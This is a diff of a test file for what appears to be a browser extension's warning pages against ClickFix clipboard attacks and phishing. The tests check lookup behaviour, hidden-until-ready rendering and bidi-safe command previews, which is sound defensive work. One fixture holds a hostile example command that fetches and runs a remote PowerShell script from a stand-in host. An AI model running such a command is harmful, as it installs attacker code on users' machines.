@@ -11,10 +11,12 @@ test("interstitial status changes are exposed through an accessible live region"
 });
 
 test("the command preview is explicitly LTR and bidi-isolated", () => {
-  const html = readFileSync(require.resolve("./interstitial.html"), "utf8");
   const css = readFileSync(require.resolve("./interstitial.css"), "utf8");
-  assert.match(html, /id="yp-command-label"[^>]*>Clipboard text \(control characters shown as ⟦…⟧\)/);
-  assert.match(html, /id="yp-command-preview"[^>]+dir="ltr"/);
+  for (const page of ["./clickfix.html", "./interstitial.html"]) {
+    const html = readFileSync(require.resolve(page), "utf8");
+    assert.match(html, /id="yp-command-label"[^>]*>Clipboard text \(control characters shown as ⟦…⟧\)/, page);
+    assert.match(html, /id="yp-command-preview"[^>]+dir="ltr"/, page);
+  }
   assert.match(css, /\.yp-command-preview\s*\{[\s\S]*?direction:\s*ltr;[\s\S]*?unicode-bidi:\s*isolate;/);
 });
 
@@ -50,6 +52,9 @@ function fakeNode({ hidden = false } = {}) {
       add(...names) {
         names.forEach((name) => classes.add(name));
       },
+      remove(...names) {
+        names.forEach((name) => classes.delete(name));
+      },
       contains(name) {
         return classes.has(name);
       },
@@ -76,35 +81,43 @@ function fakeNode({ hidden = false } = {}) {
   };
 }
 
+// Issue #29 — the ClickFix page is its own entry point, and the ids it carries
+// are only the ones that kind uses. The kind follows the document, not the
+// query string, so this markup can never render another warning's copy.
+const CLICKFIX_ELEMENT_IDS = [
+  "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
+  "yp-command-reason", "yp-command-label", "yp-command-preview",
+  "yp-btn-close", "yp-btn-proceed",
+];
+
 async function loadClickfixInterstitial({
   mode = "warn",
   text = "powershell iwr https://evil.test/a.ps1 | iex",
+  warningResponse,
+  search = "?kind=clickfix&request=request-a",
+  pathname = "/interstitial/clickfix.html",
 } = {}) {
-  const ids = [
-    "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
-    "yp-command-reason", "yp-command-label", "yp-command-preview",
-    "yp-btn-close", "yp-btn-proceed", "yp-btn-reanalyse",
-    "yp-btn-continue", "yp-btn-leave",
-  ];
-  const elements = new Map(ids.map((id) => [
+  const elements = new Map(CLICKFIX_ELEMENT_IDS.map((id) => [
     id,
     fakeNode({
-      hidden: id === "yp-command-reason" || id === "yp-command-label" || id === "yp-command-preview" ||
-        id === "yp-btn-proceed" || id === "yp-btn-reanalyse" ||
-        id === "yp-btn-continue" || id === "yp-btn-leave",
+      hidden: id === "yp-command-reason" || id === "yp-command-label" ||
+        id === "yp-command-preview" || id === "yp-btn-proceed",
     }),
   ]));
   const documentListeners = new Map();
+  // The published page starts with the card hidden; nothing is visible until
+  // the retrieved verdict has been written into it.
   const body = fakeNode();
+  body.classList.add("yp-kind-clickfix-pending");
   const sent = [];
   let copyCalls = 0;
 
-  global.location = { search: "?kind=clickfix&request=request-a" };
+  global.location = { search, pathname };
   global.document = {
     title: "",
     body,
     getElementById(id) {
-      return elements.get(id);
+      return elements.get(id) ?? null;
     },
     createElement(tag) {
       const node = fakeNode();
@@ -123,7 +136,7 @@ async function loadClickfixInterstitial({
       async sendMessage(message) {
         sent.push(message);
         if (message.type === "get_clickfix_warning") {
-          return {
+          return warningResponse ?? {
             ok: true,
             mode,
             source_host: "source.test",
@@ -151,6 +164,18 @@ async function loadClickfixInterstitial({
     sent,
     element(id) {
       return elements.get(id);
+    },
+    // Every line of copy the page could put in front of the user.
+    visibleText() {
+      if (body.classList.contains("yp-kind-clickfix-pending")) return "";
+      return CLICKFIX_ELEMENT_IDS
+        .map((id) => elements.get(id))
+        .filter((node) => node.hidden !== true)
+        .map((node) => node.textContent)
+        .join("\n");
+    },
+    lookups() {
+      return sent.filter((message) => message.type === "get_clickfix_warning").length;
     },
     get copyCalls() {
       return copyCalls;
@@ -259,6 +284,98 @@ test("closing a ClickFix warning consumes the request before closing the tab", a
 });
 
 // =============================================================================
+// STATE BEFORE NAVIGATION (issue #29)
+//
+// The page is navigated only after its verdict is persisted and bound to this
+// exact tab, so one lookup is authoritative. The five-second binding retry and
+// the "Clipboard request expired" page it fed are gone.
+// =============================================================================
+
+test("the ClickFix page performs exactly one warning lookup and never retries", async () => {
+  for (const mode of ["warn", "strict"]) {
+    const page = await loadClickfixInterstitial({ mode });
+    assert.equal(page.lookups(), 1, `${mode} mode asks once, like phishing and device-code`);
+  }
+
+  const source = readFileSync(SCRIPT_PATH, "utf8");
+  assert.doesNotMatch(source, /bindingDeadline|5_000/, "no binding deadline remains");
+  assert.doesNotMatch(source, /Clipboard request expired/);
+  assert.doesNotMatch(
+    source,
+    /do \{[\s\S]*?get_clickfix_warning[\s\S]*?\} while/,
+    "the lookup must not sit in a retry loop"
+  );
+});
+
+test("a failed ClickFix lookup closes the tab instead of rendering a fallback page", async () => {
+  const page = await loadClickfixInterstitial({ warningResponse: { ok: false } });
+
+  assert.deepEqual(page.sent.map((message) => message.type), [
+    "get_clickfix_warning",
+    "clickfix_warning_unavailable",
+  ]);
+  // Nothing was revealed, and no expired / unavailable / loading copy exists.
+  assert.equal(page.visibleText(), "");
+  assert.equal(page.element("yp-title").textContent, "");
+  assert.equal(page.element("yp-message").textContent, "");
+  assert.equal(page.body.classList.contains("yp-kind-clickfix-pending"), true);
+  assert.equal(page.body.classList.contains("yp-kind-clickfix-block"), false);
+  assert.equal(page.body.classList.contains("yp-kind-clickfix-warn"), false);
+  assert.equal(badgeOf(page), null);
+  assert.equal(page.element("yp-btn-proceed").hidden, true);
+});
+
+// The card is invisible until the retrieved verdict has been written into it,
+// so the first thing the user can read is the verdict itself.
+test("the first visible ClickFix content is the verdict, revealed only once it is written", async () => {
+  const warned = await loadClickfixInterstitial({ mode: "warn" });
+  assert.equal(warned.body.classList.contains("yp-kind-clickfix-pending"), false);
+  assert.match(warned.visibleText(), /Potentially dangerous command/);
+
+  const blocked = await loadClickfixInterstitial({ mode: "strict" });
+  assert.equal(blocked.body.classList.contains("yp-kind-clickfix-pending"), false);
+  assert.match(blocked.visibleText(), /Dangerous command blocked/);
+
+  const html = readFileSync(require.resolve("./clickfix.html"), "utf8");
+  assert.match(html, /<body class="yp-kind-clickfix-pending">/);
+  assert.match(html, /<h1 id="yp-title" tabindex="-1"><\/h1>/, "the heading ships empty");
+  const css = readFileSync(require.resolve("./interstitial.css"), "utf8");
+  assert.match(css, /body\.yp-kind-clickfix-pending \.yp-card\s*\{[^}]*visibility:\s*hidden/);
+});
+
+test("a ClickFix page can never expose phishing-specific copy", async () => {
+  const phishingCopy = /Deceptive site ahead|impersonating|No active phishing warning/i;
+
+  const html = readFileSync(require.resolve("./clickfix.html"), "utf8");
+  assert.doesNotMatch(html, phishingCopy, "the ClickFix document carries no phishing markup");
+
+  for (const mode of ["warn", "strict"]) {
+    const page = await loadClickfixInterstitial({ mode });
+    assert.doesNotMatch(page.visibleText(), phishingCopy);
+  }
+
+  // The kind follows the document, not the query string: an edited "?kind="
+  // cannot make the ClickFix page render another kind, and cannot make the
+  // shared page -- whose static heading is the phishing one -- render a
+  // clipboard warning.
+  const forcedPhishingKind = await loadClickfixInterstitial({
+    mode: "warn",
+    search: "?kind=phishing&request=request-a",
+  });
+  assert.equal(forcedPhishingKind.lookups(), 1);
+  assert.match(forcedPhishingKind.element("yp-title").textContent, /Potentially dangerous command/);
+
+  const forcedClickfixKind = await loadPhishingInterstitial({
+    search: "?kind=clickfix&request=request-a",
+  });
+  assert.deepEqual(
+    forcedClickfixKind.sent.map((message) => message.type).filter((type) => type !== "set_icon_state"),
+    ["get_phishing_warning"],
+    "the shared page never asks for a clipboard verdict"
+  );
+});
+
+// =============================================================================
 // DEVICE-CODE PHISHING (issue #39)
 // =============================================================================
 
@@ -283,7 +400,7 @@ async function loadDeviceFlowInterstitial({
   const body = fakeNode();
   const sent = [];
 
-  global.location = { search: "?kind=device_flow" };
+  global.location = { search: "?kind=device_flow", pathname: "/interstitial/interstitial.html" };
   global.document = {
     title: "",
     body,
@@ -390,6 +507,7 @@ test("closing the device-flow interstitial sends close_tab", async () => {
 
 async function loadPhishingInterstitial({
   response = { ok: true, fqdn: "evil.example", best_match_fqdn: "bank.test" },
+  search = "?kind=phishing",
 } = {}) {
   const ids = [
     "yp-brand", "yp-icon", "yp-title", "yp-message", "yp-hint",
@@ -409,7 +527,7 @@ async function loadPhishingInterstitial({
   const body = fakeNode();
   const sent = [];
 
-  global.location = { search: "?kind=phishing" };
+  global.location = { search, pathname: "/interstitial/interstitial.html" };
   global.document = {
     title: "",
     body,
@@ -494,8 +612,8 @@ test("every interstitial names itself and its severity above the heading", async
 
 // The severity line travels with the badge, so the states that deliberately
 // assert no badge -- nothing is being warned about any more -- must also claim
-// no severity. (ClickFix expiry takes the same branch but only after its 5 s
-// worker-binding retry, which is not worth spending in a unit test.)
+// no severity. ClickFix has no such state at all any more (issue #29): it
+// either renders its verdict or closes its own tab.
 test("a page with no warning left to show claims no severity", async () => {
   // The stub starts every node empty, so an untouched brand line is exactly
   // the HTML default, "Yodel Phish".
